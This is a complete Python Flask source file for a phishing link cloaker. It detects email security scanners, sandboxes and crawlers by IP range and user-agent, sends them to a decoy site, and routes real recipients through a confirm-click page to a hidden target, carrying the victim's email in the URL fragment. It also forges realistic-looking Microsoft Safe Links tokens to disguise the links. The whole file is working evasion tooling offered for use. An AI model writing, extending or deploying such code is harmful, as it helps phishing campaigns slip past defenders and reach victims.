import os
import time
import json
import secrets
import string
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import urlsplit, urlunsplit, urlencode, parse_qsl, quote

import httpx
from flask import (
    Flask, request, redirect, render_template_string,
    abort, make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY")
if not SK:
    raise RuntimeError("SECRET_KEY env var required")
if len(SK) < 32:
    raise RuntimeError("SECRET_KEY must be >= 32 chars")

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
TOKEN_TTL = int(os.environ.get("TOKEN_TTL_SECONDS", str(60 * 60 * 24 * 7)))
LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
KV_URL = os.environ.get("KV_REST_API_URL", "")
KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")

UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")
RATE_LIMIT_PER_MIN = int(os.environ.get("RATE_LIMIT_PER_MIN", "0"))

app = Flask(__name__)
app.secret_key = SK.encode()
serializer = URLSafeTimedSerializer(app.secret_key, salt="link-gate")
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks & UAs
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
PROOFPOINT = [
    ip_network("148.163.0.0/16"), ip_network("67.231.144.0/20"),
    ip_network("185.132.40.0/22"), ip_network("185.132.44.0/22"),
    ip_network("194.154.77.0/24"), ip_network("195.245.230.0/23"),
    ip_network("62.128.218.0/23"),
    ip_network("217.146.94.0/23"), ip_network("217.146.96.0/20"),
]
MIMECAST = [ip_network("207.211.30.0/23"), ip_network("91.220.42.0/24")]
BARRACUDA = [ip_network("64.235.144.0/20"), ip_network("209.240.128.0/19")]
TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]

SCANNER_NETS = {
    "microsoft_eop": EOP,
    "proofpoint": PROOFPOINT,
    "mimecast": MIMECAST,
    "barracuda": BARRACUDA,
    "cisco_talos": TALOS,
    "google_safebrowsing": GOOGLE_SAFEBROWSING,
    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
    "cloudflare_email": [ip_network("104.30.0.0/18")],
    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
}

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint",
    "pp-url", "mimecast", "barracuda", "talos", "ironport",
    "forcepoint", "symantec", "messagelabs", "trendmicro", "trend micro",
    "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security",
    "avanan", "ironscales", "cloudmark", "agari", "valimail",
    "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
    "intezer", "cape sandbox", "reverse.it", "filescan.io",
    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
    "nuzzel", "vk share", "w3c_validator",
    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
    "headlesschrome", "phantomjs", "puppeteer", "playwright",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
    "statuscake", "site24x7", "newrelic", "datadog synthetics",
)

ALLOWLIST_IPS = []
ALLOWLIST_UA = ()


def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or ""


def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    if any(tok in low for tok in ALLOWLIST_UA):
        out["source"] = "allowlist_ua"
        return out
    try:
        a = ip_address(ip)
    except ValueError:
        a = None
    if a is not None:
        if any(a in n for n in ALLOWLIST_IPS):
            out["source"] = "allowlist_ip"
            return out
        for name, nets in SCANNER_NETS.items():
            if any(a in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip"
                break
    if not out["scanner"]:
        for tok in SCANNER_UA_TOKENS:
            if tok in low:
                out["scanner"] = True
                out["source"] = tok
                out["method"] = "ua"
                break
    return out


def _valid_http_url(u: str) -> bool:
    return isinstance(u, str) and u.startswith(("http://", "https://"))


def _append_query(base_url: str, extra: dict) -> str:
    if not extra:
        return base_url
    parts = urlsplit(base_url)
    existing = dict(parse_qsl(parts.query, keep_blank_values=True))
    existing.update(extra)
    return urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urlencode(existing), parts.fragment,
    ))


# ---------------------------------------------------------------------------
# KV (rate limit only)
# ---------------------------------------------------------------------------
async def kv_incr(key: str, ttl: int) -> int:
    if not KV_URL or not KV_TOKEN:
        return 0
    async with httpx.AsyncClient(timeout=3.0) as c:
        try:
            r = await c.post(
                f"{KV_URL}/incr/{key}",
                headers={"Authorization": f"Bearer {KV_TOKEN}"},
                params={"EX": str(ttl)},
            )
            r.raise_for_status()
            return int(r.json().get("result") or 0)
        except Exception as e:
            log.error(json.dumps({"event": "kv_incr_failed", "err": str(e), "key": key[:32]}))
            return 0


async def emit_log(event: dict) -> None:
    log.info(json.dumps(event, separators=(",", ":")))
    if LOG_WEBHOOK_URL:
        try:
            async with httpx.AsyncClient(timeout=3.0) as c:
                await c.post(LOG_WEBHOOK_URL, json=event)
        except httpx.HTTPError:
            pass


def _apply_unified_headers(resp):
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["Expires"] = "0"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "img-src 'self' data: https:; "
        "style-src 'self' 'unsafe-inline' https:; "
        "font-src 'self' data: https:; "
        "script-src 'none'; "
        "connect-src 'none'; "
        "form-action *; "
        "base-uri 'none'; "
        "frame-ancestors 'none'"
    )


def _static_page(title: str, text: str, status_code: int):
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
    <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
    .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
    </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
    resp = make_response(html, status_code)
    _apply_unified_headers(resp)
    return resp


LANDING = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="no-referrer">
<title>{{ title }}</title>
<style>
  :root { color-scheme: light; }
  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9;padding:1rem}
  .card{background:#fff;padding:2rem 2.5rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:440px;width:100%;text-align:center;box-sizing:border-box}
  h1{font-size:1.25rem;margin:0 0 1rem;color:#111;font-weight:600}
  p{color:#444;margin:0 0 1.5rem;line-height:1.5;font-size:.95rem}
  button{background:#0b5fff;color:#fff;border:0;padding:.8rem 1.6rem;border-radius:8px;font-size:1rem;cursor:pointer;width:100%}
  button:hover{background:#0847c4}
  .hp-field{position:absolute !important;left:-10000px !important;width:1px !important;height:1px !important;overflow:hidden}
</style>
</head>
<body>
  <form class="card" method="POST" action="{{ action }}" autocomplete="off">
    <h1>{{ title }}</h1>
    <p>{{ body }}</p>
    <input type="text" name="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
    <input type="hidden" name="t" value="{{ token }}">
    <input type="hidden" name="n" value="{{ nonce }}">
    {% for k, v in forwarded.items() %}
    <input type="hidden" name="{{ k }}" value="{{ v }}">
    {% endfor %}
    <button type="submit">{{ cta }}</button>
  </form>
</body>
</html>"""


# ---------------------------------------------------------------------------
# routes
# ---------------------------------------------------------------------------
@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True, "ts": int(time.time()), "mode": "broadcast"})


@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)


@app.route("/ls/<token>", methods=["GET"])
async def landing(token: str):
    try:
        data = serializer.loads(token, max_age=TOKEN_TTL)
    except SignatureExpired:
        return _static_page("Link expired", "This link is no longer valid.", 410)
    except BadSignature:
        return _static_page("Invalid link", "This link is not valid.", 404)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    await emit_log({"event": "landing_get", **tag, "token": token[:12]})

    if tag["scanner"]:
        unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
        if not _valid_http_url(unwanted):
            unwanted = UNWANTED_REDIRECT_URL
        await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
        return redirect(unwanted, code=302)

    # forward allowed query params
    allowed = set(data.get("params", []))
    forwarded = {k: v for k, v in request.args.items() if k in allowed and v}

    # fragment_param carries a value that becomes the #fragment on the target
    fp = data.get("fragment_param", "")
    if fp and request.args.get(fp):
        forwarded[fp] = request.args.get(fp)

    nonce_payload = {"t": token, "n": secrets.token_urlsafe(16), "ts": time.time()}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(
        LANDING,
        action=f"/submit/{token}",
        token=token,
        nonce=nonce_blob,
        forwarded=forwarded,
        title=data.get("title", "Confirm your request"),
        body=data.get("body", "Click the button below to continue."),
        cta=data.get("cta", "Click here to confirm"),
    )

    resp = make_response(html)
    is_https = (
        request.headers.get("X-Forwarded-Proto", "http") == "https"
        or request.is_secure
    )
    resp.set_cookie(
        "gate_session",
        nonce_blob,
        max_age=GATE_TTL,
        httponly=True,
        secure=is_https,
        samesite="None",
        path="/",
    )
    _apply_unified_headers(resp)
    return resp


@app.route("/submit/<token>", methods=["POST"])
async def execute(token: str):
    tag = classify(client_ip(), request.headers.get("User-Agent", ""))

    if tag["scanner"]:
        try:
            data = serializer.loads(token, max_age=TOKEN_TTL)
            unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
        except (SignatureExpired, BadSignature):
            unwanted = UNWANTED_REDIRECT_URL
        if not _valid_http_url(unwanted):
            unwanted = UNWANTED_REDIRECT_URL
        await emit_log({"event": "post_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
        return redirect(unwanted, code=302)

    if request.form.get("email_confirm_hp"):
        await emit_log({"event": "post_honeypot", "ip": client_ip(), "token": token[:12]})
        return _static_page("Submission Blocked", "Automated behavior detected.", 400)

    submitted_blob = request.form.get("n", "")
    if not submitted_blob:
        return _static_page("Missing Context", "Verification payload missing.", 400)

    try:
        nonce_data = cookie_serializer.loads(submitted_blob, max_age=GATE_TTL)
    except (SignatureExpired, BadSignature):
        return _static_page("Session Expired", "Verification context expired.", 400)

    is_token_valid = secrets.compare_digest(nonce_data.get("t", ""), token)
    is_fresh = (time.time() - float(nonce_data.get("ts", 0))) < GATE_TTL

    if not (is_token_valid and is_fresh):
        await emit_log({"event": "post_mismatch", "ip": client_ip(), "token": token[:12]})
        return _static_page("Verification Failed", "Verification payload mismatched.", 400)

    if RATE_LIMIT_PER_MIN > 0:
        n = await kv_incr(f"rl:{client_ip()}:{token[:16]}", 60)
        if n and n > RATE_LIMIT_PER_MIN:
            await emit_log({"event": "post_ratelimited", "ip": client_ip(), "token": token[:12], "n": n})
            return _static_page("Too Many Requests", "Please wait before trying again.", 429)

    try:
        data = serializer.loads(token, max_age=TOKEN_TTL)
    except SignatureExpired:
        return _static_page("Link expired", "This link is no longer valid.", 410)
    except BadSignature:
        return _static_page("Invalid link", "This link is not valid.", 404)

    target = data["target"]

    # query-string params (previous behavior)
    allowed_q = set(data.get("params", []))
    q_forward = {k: request.form.get(k, "") for k in allowed_q if request.form.get(k)}
    if q_forward:
        target = _append_query(target, q_forward)

    # fragment param — appended after '#'
    fp = data.get("fragment_param", "")
    fv = ""
    if fp:
        fv = request.form.get(fp, "")
        if fv:
            base = target.split("#", 1)[0]
            target = f"{base}#{quote(fv, safe='@.-_')}"

    await emit_log({"event": "post_ok", **tag, "token": token[:12],
                    "q": q_forward, "fragment": fv})

    resp = make_response(redirect(target, code=303))
    resp.delete_cookie("gate_session", path="/")
    _apply_unified_headers(resp)
    return resp


def generate_eop_token(target_url):
    """Generates a highly realistic Microsoft EOP Safe Links token."""
    length = secrets.choice(range(180, 280))
    alphabet = string.ascii_letters + string.digits + "-_"
    
    random_core = ''.join(secrets.choice(alphabet) for _ in range(length))
    
    raw_target = target_url.encode('utf-8')
    b64_target = base64.urlsafe_b64encode(raw_target).decode('utf-8').rstrip('=')
    
    combined = f"{random_core}-{b64_target}"
    
    num_encoded = secrets.choice(range(2, 6))
    parts = list(combined)
    
    for _ in range(num_encoded):
        idx = secrets.choice(range(10, len(parts) - 10))
        hex_val = secrets.choice(["2F", "3D", "3A", "2B"])
        parts.insert(idx, f"-{hex_val}")
        
    final_payload = "".join(parts)
    return f"u001.{final_payload}"


@app.route("/mint", methods=["POST"])
def mint():
    admin_key = os.environ.get("ADMIN_KEY", "")
    if not admin_key or request.headers.get("X-Admin-Key") != admin_key:
        abort(404)

    body = request.get_json(silent=True) or {}

    target = body.get("target")
    if not _valid_http_url(target):
        return jsonify({"error": "target must be an http(s) URL"}), 400

    unwanted_target = body.get("unwanted_target")
    if unwanted_target and not _valid_http_url(unwanted_target):
        return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400

    allowed_params = body.get("params") or []
    if not isinstance(allowed_params, list) or not all(isinstance(p, str) for p in allowed_params):
        return jsonify({"error": "params must be a list of strings"}), 400
    allowed_params = [
        p for p in allowed_params
        if 1 <= len(p) <= 64 and all(c.isalnum() or c in "-_.:@" for c in p)
    ]

    fragment_param = body.get("fragment_param", "") or ""
    if fragment_param:
        if not isinstance(fragment_param, str) or not (1 <= len(fragment_param) <= 64):
            return jsonify({"error": "fragment_param must be a short string"}), 400
        if not all(c.isalnum() or c in "-_.:@" for c in fragment_param):
            return jsonify({"error": "fragment_param has invalid characters"}), 400

    tok = serializer.dumps({
        "target": target,
        "unwanted_target": unwanted_target or "",
        "title": body.get("title", "Confirm your request"),
        "body": body.get("body", "Click the button below to continue."),
        "cta": body.get("cta", "Click here to confirm"),
        "params": allowed_params,
        "fragment_param": fragment_param,
    })
    
    base = request.host_url.rstrip("/")
    
    # Generate the fake EOP token
    custom_token = body.get("click_upn")
    if not custom_token:
        custom_token = generate_eop_token(target)
        
    encoded_upn = quote(custom_token, safe='')
    
    # Construct the URL with /ls/ and click_upn
    final_url = f"{base}/ls/{tok}?click_upn={encoded_upn}"
    
    return jsonify({
        "url": final_url,
        "token": tok,
        "click_upn": custom_token
    })


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
